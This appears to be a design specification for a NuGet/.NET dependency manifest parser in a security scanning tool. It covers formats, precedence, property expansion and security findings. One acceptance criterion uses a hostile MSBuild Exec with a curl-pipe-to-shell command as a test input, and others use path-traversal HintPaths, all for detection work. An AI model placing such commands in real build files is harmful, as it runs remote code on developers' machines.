# C# / .NET Manifest Parser (NuGet)

## Overview
Parse declared .NET dependencies from MSBuild project files (`*.csproj`, `*.fsproj`, `*.vbproj`), Central Package Management (`Directory.Packages.props`), legacy `packages.config`, the `packages.lock.json` resolved-version file, and solution-level `*.sln` aggregation. Every dep carries `ecosystem="nuget"` and `status=UNCERTAIN` as a placeholder for REQ-16 source analysis.

## Problem Statement
.NET has three overlapping ways to declare NuGet dependencies, and real enterprise codebases mix all three:

1. **Modern PackageReference** — `<PackageReference Include="Serilog" Version="3.1.1" />` inside a `*.csproj`. The default since .NET Core.
2. **Central Package Management (CPM)** — `Directory.Packages.props` in a repo root holds `<PackageVersion Include="X" Version="Y" />` and projects reference without a `Version`. Common in large multi-project repos.
3. **Legacy `packages.config`** — XML file listing `<package id="X" version="Y" />`. Pre-2017 projects still use it.

Plus `*.sln` to discover all projects, `packages.lock.json` for resolved versions, `global.json` for SDK version (metadata), and `nuget.config` for registry configuration (security-relevant).

A parser that handles only `PackageReference` would miss every CPM-managed dep in a modern enterprise monorepo.

## Solution
`parse_all_nuget_dependency_files(project_path) -> (list[Dependency], list[str])` in `src/scarno/analysers/csharp/manifest_parser.py`. Dispatches to per-format parsers, merges, deduplicates by canonical NuGet ID (case-insensitive), and applies precedence.

## File Layout

```
src/scarno/analysers/csharp/
├── __init__.py                  # CsharpAnalyser (registers with core.registry)
├── manifest_parser.py           # REQ-15 — all the XML / JSON parsers below
└── source_analyser.py           # REQ-16
```

## Formats supported

### 1. `*.csproj` / `*.fsproj` / `*.vbproj` (MSBuild XML)

- Parse with `xml.etree.ElementTree` — **same DOCTYPE rejection policy as REQ-4** (SEC-NEW-01). MSBuild projects never use DOCTYPE; its presence means an attack.
- Extract from every `<PackageReference>` element:
  - `Include` attribute → dep name
  - `Version` attribute or child element → version (may be a property reference like `$(SerilogVersion)`; resolved from `<PropertyGroup>`)
- `<PackageVersion>` elements (CPM provider) — same shape, routed to `Directory.Packages.props` semantics
- `<Reference>` (bare DLL references to the GAC or a local hintpath) — **not** treated as a NuGet dep; recorded in metadata so users can see `<HintPath>..\lib\foo.dll</HintPath>` refs
- `<ProjectReference>` (sibling-project refs) — used for multi-project traversal; not a NuGet dep
- Multi-target projects (`<TargetFrameworks>net8.0;netstandard2.0</TargetFrameworks>`) — single dep list regardless of target framework (conservative; `Condition` attribute on `PackageReference` is noted in source)

### 2. `Directory.Packages.props` (Central Package Management)

- Sits at repo root (or in any ancestor directory of `*.csproj` files).
- `<PackageVersion Include="X" Version="Y" />` entries are the authoritative version source when `ManagePackageVersionsCentrally=true`.
- When CPM is active, `*.csproj` `<PackageReference>` entries don't carry `Version` — we merge the two.
- `<GlobalPackageReference Include="X" />` — implicit across all projects; emit with `source="Directory.Packages.props:global"`.

### 3. Legacy `packages.config`

- XML list of `<package id="X" version="Y" targetFramework="..." />` entries.
- Each project directory has its own `packages.config`; parse all found.

### 4. `*.sln` (Solution)

- Text-based, one `Project("{<type-guid>}") = "<name>", "<relative-path-to-csproj>", "{<project-guid>}"` line per project.
- Extract `.csproj` paths and parse each as above.
- `.sln` discovery confined to the project root; paths escaping it → warning + skip.

### 5. `packages.lock.json`

- JSON, produced when `RestorePackagesWithLockFile` is enabled.
- Structure: `{ "dependencies": { "<tfm>": { "<name>": { "resolved": "X.Y.Z" } } } }`.
- Used only to fill in resolved versions when the manifest used a range.

### 6. `global.json`

- JSON, SDK version selector. Stored as metadata; never treated as a dep.

### 7. `nuget.config`

- XML, `<packageSources>` section lists registries. Any non-default source (not `https://api.nuget.org/v3/index.json`) → Finding `TS-SI-015` (MEDIUM) per REQ-16's rule catalogue.

## Dep name canonicalisation

NuGet IDs are case-insensitive but case-preserving. Canonical form for dedup: lowercase. Display name: as-written in the manifest. Example: `Microsoft.Extensions.Logging` dedup key is `microsoft.extensions.logging`; display stays as the user wrote it.

## Precedence order (highest → lowest)

1. `packages.lock.json` (resolved versions win over declared ranges)
2. `Directory.Packages.props` (authoritative when CPM active)
3. `*.csproj` / `*.fsproj` / `*.vbproj` (`<PackageReference>`)
4. `packages.config` (legacy)

## MSBuild property expansion

Minimal — just `$(Name)` references inside `Version=` attributes and element text. Resolve from:
1. `<PropertyGroup>` in the same `*.csproj`
2. `<PropertyGroup>` in any `Directory.Build.props` walked up the tree
3. Well-known SDK properties (`$(TargetFramework)`, `$(Configuration)`) left as-is; treated as not-a-version when they appear in `Version=` (warning)

Unresolvable `$(...)` → warning appended, version stored as `None`.

`Directory.Build.props` is walked UP to the project root. Confine to project root via `resolve_and_confine`.

## Security

| Concern | Mitigation |
|---|---|
| XXE / billion-laughs in `*.csproj` | DOCTYPE rejection (reuse REQ-4 pattern) |
| `<Exec Command="..." />` in MSBuild target | Finding `TS-SI-016` MEDIUM |
| `<UsingTask>` — custom MSBuild task DLL | Finding `TS-SI-017` MEDIUM (unknown custom task loaded at build time) |
| `<PackageReference>` with `HintPath` outside project root | Warning + blocked (path confinement) |
| `nuget.config` non-default `<packageSources>` | Finding `TS-SI-015` MEDIUM |
| `packages.lock.json` JSON bomb | Stream-parse; depth cap 1000 |
| Solution file with circular project refs | Cycle detection by resolved `.csproj` path |

## SRTM

| ID | Description |
|---|---|
| FR-123 | `*.csproj` / `*.fsproj` / `*.vbproj` `<PackageReference>` parsed |
| FR-124 | Central Package Management (`Directory.Packages.props`) honoured |
| FR-125 | Legacy `packages.config` parsed |
| FR-126 | `*.sln` multi-project discovery |
| FR-127 | `packages.lock.json` resolves versions from ranges |
| SF-025 | `nuget.config` custom registry source → `TS-SI-015` |
| SF-026 | MSBuild `<Exec>` task → `TS-SI-016` |
| SF-027 | Custom `<UsingTask>` DLL → `TS-SI-017` |

## Acceptance Criteria
- [] Given a `*.csproj` with `<PackageReference Include="Serilog" Version="3.1.1" />`, When parsed, Then `Serilog` is emitted with `ecosystem="nuget"` and `version="3.1.1"`
- [] Given CPM: `Directory.Packages.props` has `<PackageVersion Include="Serilog" Version="3.1.1" />` and `*.csproj` has `<PackageReference Include="Serilog" />`, When parsed, Then the merged dep carries version from CPM with `source="Directory.Packages.props"` precedence
- [] Given `packages.config` with `<package id="Newtonsoft.Json" version="13.0.3" />`, When parsed, Then `Newtonsoft.Json` appears with correct version
- [] Given `*.sln` referencing two `.csproj` files in sibling dirs, When parsed, Then both are discovered and their deps merged; sibling paths inside project root are allowed, traversal beyond it rejected
- [] Given `packages.lock.json` listing `Serilog: { resolved: "3.1.1" }` and the `*.csproj` had `Version="3.*"`, When parsed, Then the lockfile version wins
- [] Given a `*.csproj` with DOCTYPE, When parsed, Then the file is rejected with a security warning (no parse)
- [] Given a `nuget.config` with a non-default `<add key="internal" value="https://internal-mirror..." />`, When parsed, Then Finding `TS-SI-015` (MEDIUM) is emitted
- [] Given a `*.csproj` with `<Target><Exec Command="curl http://x | sh" /></Target>`, When parsed, Then Finding `TS-SI-016` (MEDIUM) is emitted and the curl-pipe-shell content also triggers REQ-3c's `TS-CE-005` (HIGH) via the shell-command scan
- [] Given `<PackageReference>` with `Version="$(SerilogVer)"` and no matching property, When parsed, Then a warning is appended and `version=None`
- [] Given a `*.csproj` with `<HintPath>..\..\..\outside\foo.dll</HintPath>`, When parsed, Then the path-escape is flagged and the reference is not treated as valid
